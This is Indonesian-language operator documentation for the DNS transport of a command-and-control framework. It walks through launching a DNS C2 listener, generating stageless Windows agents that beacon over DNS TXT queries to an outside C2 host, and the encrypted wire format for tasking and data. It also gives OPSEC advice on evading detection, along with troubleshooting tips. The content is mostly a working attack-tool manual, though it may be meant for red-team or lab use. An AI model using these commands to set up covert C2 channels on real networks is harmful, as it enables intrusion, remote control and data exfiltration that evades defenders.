# Transport: DNS (Native)

Agent mengirim data C2 langsung sebagai DNS TXT query ke authoritative DNS server (server C2) — **tanpa** melewati public resolver. Berbeda dengan DoH yang pakai Cloudflare/Google sebagai perantara, DNS native langsung bisa dikontrol sepenuhnya tanpa ketergantungan third-party.

---

## Perbedaan DNS Native vs DoH

| Aspek | DNS Native | DoH |
|-------|-----------|-----|
| Routing | Agent → C2 DNS server langsung | Agent → Cloudflare/Google → C2 DNS server |
| Port | UDP 53 (atau custom) | TCP 443 |
| Evasion | Baik (DNS terlihat normal) | Sangat baik (HTTPS ke 1.1.1.1) |
| Prasyarat | Domain + NS delegation | Domain + NS delegation |
| Custom resolver | Bisa set manual | Tidak (selalu Cloudflare/Google) |
| Offline capable | Ya (private network) | Tidak (butuh akses Cloudflare/Google) |

---

## Kapan Dipakai

- **Internal network pivoting** — target di jaringan yang tidak bisa akses internet sama sekali, tapi DNS internal terbuka
- Environment yang punya **internal DNS server** yang bisa diarahkan ke server C2
- Ketika DoH tidak bisa dipakai (Cloudflare/Google diblock)
- Lab testing DNS covert channel tanpa domain publik (pakai IP langsung)

> **OPSEC note**: DNS query ke IP server C2 langsung lebih mudah dideteksi daripada DoH (tidak ada cover traffic dari Cloudflare). Gunakan nama domain yang legitimate atau sembunyikan di balik internal DNS resolver.

---

## Arsitektur

```
[Agent] --UDP TXT query--> [C2 DNS Listener :5353]
```

Atau via internal DNS (split-horizon):

```
[Agent] --UDP query--> [Internal DNS :53] --forward--> [C2 DNS :5353]
                            (BIND/Unbound)
```

---

## Prasyarat

Sama seperti DoH, DNS native membutuhkan **authoritative control** atas sebuah zone. Dua mode:

### Mode A: Domain publik (sama seperti DoH setup)

Set NS record untuk subdomain ke IP server C2:
```
tunnel.example.com.  NS  ns1.example.com.
ns1.example.com.     A   <IP-server-C2>
```

### Mode B: Internal DNS (lab / private network)

Tidak butuh domain publik. Set DNS server agent ke IP server C2 secara langsung via `--dns-server`:

```bash
# Agent langsung query C2 DNS di 192.168.1.10:5353
go run ./cmd/generate/ stageless \
  --transport dns \
  --dns-domain c2.internal \
  --dns-server 192.168.1.10:5353 \
  ...
```

Ini cocok untuk lab atau pivot lewat internal network.

---

## Step 1 — Start Server (DNS)

```bash
# Basic DNS listener
ENCRYPTION_KEY=MySecretKey32Chars00000000000000 \
  go run ./cmd/server \
  --dns \
  --dns-domain tunnel.example.com \
  --dns-port 5353 \
  -port 8080

# Untuk port 53 (production, butuh root atau DNAT)
sudo ENCRYPTION_KEY=... go run ./cmd/server \
  --dns \
  --dns-domain tunnel.example.com \
  --dns-port 53

# Alternatif DNAT (non-root)
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353
ENCRYPTION_KEY=... go run ./cmd/server \
  --dns --dns-domain tunnel.example.com --dns-port 5353
```

| Flag | Env | Default | Keterangan |
|------|-----|---------|-----------|
| `--dns` | `$DNS_ENABLED` | `false` | Aktifkan DNS authoritative listener |
| `--dns-domain` | `$DNS_DOMAIN` | (required) | Zone yang dikontrol |
| `--dns-port` | `$DNS_PORT` | `5353` | UDP port |

**Expected log:**
```
  [✓]  DNS listener  ·  udp://0.0.0.0:5353  zone=tunnel.example.com
```

---

## Step 2 — Generate Agent (DNS)

```bash
# DNS via domain publik (NS delegation ke C2)
go run ./cmd/generate/ stageless \
  --c2 https://c2.example.com \
  --key MySecretKey32Chars00000000000000 \
  --transport dns \
  --dns-domain tunnel.example.com \
  --output bin/agent_dns.exe

# DNS langsung ke C2 server (lab / internal network)
go run ./cmd/generate/ stageless \
  --c2 http://192.168.1.10:8080 \
  --key MySecretKey32Chars00000000000000 \
  --transport dns \
  --dns-domain c2.internal \
  --dns-server 192.168.1.10:5353 \
  --output bin/agent_dns_internal.exe
```

| Flag | Default | Keterangan |
|------|---------|-----------|
| `--transport dns` | — | **Wajib** untuk DNS native transport |
| `--dns-domain` | — | **Wajib** — zone yang dihandle C2 DNS listener |
| `--dns-server` | `<c2-host>:5353` | IP:port DNS server. Default: derive dari `--c2` URL hostname + port 5353. Set explicit untuk konfigurasi berbeda |

---

## Step 3 — Test DNS Listener Manual

Sebelum jalankan agent, verifikasi DNS listener jalan:

```bash
# Dari mesin lain, query TXT record manual
dig TXT ORSXG5A.tunnel.example.com @<server-ip> -p 5353

# Atau dengan nslookup
nslookup -type=TXT ORSXG5A.tunnel.example.com <server-ip>
```

Server harus log:
```
[*] DNS query: ORSXG5A.tunnel.example.com  type=TXT  src=<query-ip>
```

Dan respond dengan TXT record (mungkin error/noop karena payload tidak valid — tapi response menandakan listener aktif).

---

## Step 4 — Verify Checkin

Jalankan agent, server log:
```
[+] Agent checkin (DNS): <agent-id>  DESKTOP-ABC  user
[*] DNS query: <base32>.tunnel.example.com  type=TXT
```

Catatan: setiap checkin/beacon menghasilkan beberapa DNS query (payload di-chunk karena label max 63 char).

---

## Step 5 — Verify Traffic via tcpdump

### Di server

```bash
sudo tcpdump -i eth0 -n udp port 5353
# atau port 53 jika production
```

Output per query:
```
14:23:01 IP 10.10.10.50.42389 > 10.10.10.1.5353: 1234+ TXT? ABCDEFGH...IJKLMNOP.tunnel.example.com. (82)
14:23:01 IP 10.10.10.1.5353 > 10.10.10.50.42389: 1234 1/0/0 TXT "ONSWG4Y..." (45)
```

### Wireshark filter

```
udp.port == 5353 && dns
```

atau untuk port 53:
```
dns.qry.name contains "tunnel.example.com"
```

Di setiap query, lihat:
- **Query name**: `<base32>.tunnel.example.com` — panjang label mengindikasikan payload size
- **TXT response**: base32-encoded command atau noop

---

## Step 6 — Verify Encryption

Decode payload DNS query secara manual untuk konfirmasi konten terenkripsi:

```python
import base64, sys

# Ambil bagian sebelum .tunnel.example.com, gabungkan labels
labels = "ABCDEFGH...IJKLMNOP"  # ganti dengan query name aktual
encoded = labels.upper()

# Tambah padding jika perlu
padded = encoded + "=" * (-len(encoded) % 8)
data = base64.b32decode(padded)

# Output: JSON envelope
print(data[:100])
```

Output harus berupa bytes yang mengandung `{"t":"c","a":"...","d":"..."}` di mana `"d"` field adalah base64 ciphertext (random bytes), **bukan** plaintext command.

---

## Wire Format Detail

**Agent → Server:**
```
DNS TXT query name: <base32(envelope)>.<dns-domain>
```
Label di-split tiap 63 karakter:
```
ABCDEFGH...IJKLMNOP.QRSTUVWX...YZABCDEF.tunnel.example.com
```

JSON envelope:
```json
{"t": "c"|"r"|"p", "a": "<agent-id>", "d": "<base64-AES-GCM>"}
```

**Server → Agent:**
```
TXT record value: <base32(response)>
```

Response JSON:
```json
{"s": "ok"}
{"s": "noop"}
{"s": "cmd", "c": <encrypted-command>}
```

---

## Troubleshooting

| Symptom | Penyebab | Solusi |
|---------|----------|--------|
| No DNS query di server | Agent tidak bisa reach server DNS port | Cek firewall UDP 5353; test `dig @<server> tunnel.example.com` dari target |
| `RCodeNameError` untuk semua queries | Query zone tidak match `--dns-domain` | Harus exact match: `tunnel.example.com` == `tunnel.example.com` |
| `RCodeFormatError` | Base32 decode gagal (payload corrupt) | Periksa versi Go agent vs. server — harus sama encoding |
| Checkin sukses tapi command tidak masuk | Chunking bermasalah — response TXT terlalu besar | DNS TXT record max 255 char per string. Server harus chunk response. Cek `dns_listener.go` |
| NS delegation tidak terbaca | Registrar belum propagate atau DNS cache | `dig NS tunnel.example.com @8.8.8.8 +norecurse` untuk cek authoritative |
| Agent pakai DNS server salah | `--dns-server` kosong, derive dari `--c2` URL yang mungkin bukan IP server | Set `--dns-server` explicit: `--dns-server 192.168.1.10:5353` |
